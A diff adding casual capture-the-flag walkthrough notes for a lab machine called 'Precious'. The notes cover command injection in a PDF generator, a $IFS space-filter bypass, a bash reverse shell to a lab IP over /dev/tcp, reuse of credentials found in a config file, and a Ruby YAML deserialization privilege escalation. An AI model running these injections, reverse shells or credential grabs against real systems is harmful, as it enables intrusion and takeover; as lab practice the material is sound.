@@ -1,0 +1,61 @@
+Precious ez
+|
+-do da nmap shit on port 80
+|
+-pdf generator
+|
+-start up a python3 http.server 80 cause you need to have a available http server to make the requests work on the pdf generator
+
+note: using nc -lnvp 80 is pein cause nc can handle only one connection and need to keep doing it everytiem
+|
+-pdf generator vulnerable to rce using http://yer own machine ip/$(uname) or $(whoami)
+-but pein is it haets spaces so you can use $IFS for spaces but pein arises when you want to terminate the $IFS variable after the $IFS itself so you can use $IFS$- cause $- will lead to null variable which is not defined
+|
+-use that to spawn a reverse shell using that url mentioned above liek this bash -c 'bash -i >& /dev/tcp/10.10.14.61/9001 0>&1'
+|
+-or use that to get a reverse shell binary that you can host on yer own machine and tell it to get it using wget or curl
+|
+-use the sem shid to run the reverse shell also after getting the reverse shell on to the target machine
+|
+-reverse shell noiceee
+|
+-now priv esc tiem
+|
+-sudo -l tells fuk you no priviledges or any suid binaries for you so pein
+|
+-go to yer own home using ~
+|
+-do find . -type f (neat trick to find only files in the current directory)
+-you get .bundle/config which is a sus file
+|
+-cat that and you get username and password for henry
+|
+-cat ze /etc/passwd henry there also so he not npc noice
+|
+-ssh into the server using henry's shit
+|
+-do sudo -l
+-and he really not a npc cause he can execute /usr/bin/ruby /opt/update_dependencies.rb as root
+note:he can only execute the whole command as root not just ruby which is pein
+|
+-cat user.txt in henry home for user flag
+|
+-cant even edit that /opt/update_dependencies.rb file so more pein
+|
+-move to /dev/shm (some shared memory shit)
+|
+-ruby deserialization exploit idek what it mean so pein
+|
+-google ruby deserialization yaml
+|
+-first link copy paste code you get in that to dependencies.yml
+|
+-get ruby deserialization code from swisskeyrepo and check the version of ruby is correct or not using ruby -v
+|
+-and run that command that you can run as root by changing the git_set thingy
+|
+-change that to what ever command you want to run in our case we just want flag 
+|
+-it will give fuk ton of errors but look at the top you got the output for id command and you are root
+|
+-get root flag by doing cat /root/root.txt
